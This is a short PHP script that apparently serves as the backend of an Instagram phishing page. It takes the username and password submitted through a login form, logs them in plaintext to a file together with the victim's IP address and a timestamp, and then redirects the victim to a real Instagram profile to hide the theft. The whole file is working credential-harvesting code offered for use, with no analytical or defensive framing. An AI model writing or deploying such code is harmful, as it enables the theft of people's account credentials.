<?php
if ($_POST) {
	$kad = $_POST["ad"];
	$pass = $_POST["sifre"];

	if (!$kad || !$pass) {
		
		header("location:index2.php");
	}else{
		$kad = $_POST["ad"];
		$pass =  $_POST["sifre"];
		$ip = $_SERVER['REMOTE_ADDR'];
		date_default_timezone_set('Europe/Istanbul');  
		$cur_time=date("d-m-Y H:i:s");
		$file = fopen('sifre.php', 'a'); 
		fwrite($file, " Kullanıcı adı: ".$kad." Şifre: ".$pass. " İp Adres ".$ip. " Giriş Zamanı ".$cur_time. "");
		fclose($file); 
		echo '';
				 header("Refresh:1; url=https://www.instagram.com/dansfabrika/");
	}
}else{ 
	header("location:index2.php");
}
	?>


